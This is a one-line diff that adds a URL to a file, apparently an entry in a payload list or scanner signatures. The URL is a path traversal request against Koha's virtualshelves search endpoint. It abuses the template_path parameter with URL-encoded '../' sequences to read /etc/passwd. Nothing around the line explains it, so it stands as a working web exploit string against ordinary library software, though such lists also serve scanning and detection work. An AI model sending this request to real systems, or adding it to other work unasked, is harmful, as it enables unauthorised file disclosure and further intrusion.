@@ -1,0 +1,1 @@
+/cgi-bin/koha/svc/virtualshelves/search?template_path=..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2fetc%2fpasswd
